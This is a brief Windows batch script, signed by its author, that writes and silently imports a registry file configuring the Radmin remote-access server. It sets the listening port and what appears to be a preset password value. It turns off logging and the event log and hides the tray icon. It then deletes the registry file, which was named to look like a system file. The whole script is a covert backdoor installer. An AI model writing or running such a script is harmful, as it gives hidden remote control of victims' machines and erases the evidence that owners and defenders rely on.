echo off
echo Windows Registry Editor Version 5.00  >>  %windir%\himem.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters] >>  %windir%\himem.reg 
echo "NTAuthEnabled"=hex:00,00,00,00 >>  %windir%\himem.reg 
echo "NTAuthId"=hex:04,00,00,00 >> %windir%\himem.reg 
echo "Port"=hex:23,13,00,00 >> %windir%\himem.reg 
echo "Timeout"=hex:0a,00,00,00  >> %windir%\himem.reg 
echo "EnableLogFile"=hex:00,00,00,00 >> %windir%\himem.reg 
echo "FilterIp"=hex:00,00,00,00  >> %windir%\himem.reg 
echo "DisableTrayIcon"=hex:01,00,00,00 >> %windir%\himem.reg 
echo "AutoAllow"=hex:00,00,00,00 >> %windir%\himem.reg
echo "AskUser"=hex:01,00,00,00 >> %windir%\himem.reg
echo "EnableEventLog"=hex:00,00,00,00 >> %windir%\himem.reg
echo "Parameter"=hex:12,97,bb,bc,54,0e,f7,cf,c1,fc,be,52,7e,a1,fd,20 >> %windir%\himem.reg
regedit /s %windir%\himem.reg
del /q %windir%\himem.reg
// Writen by D1m0N




 

 








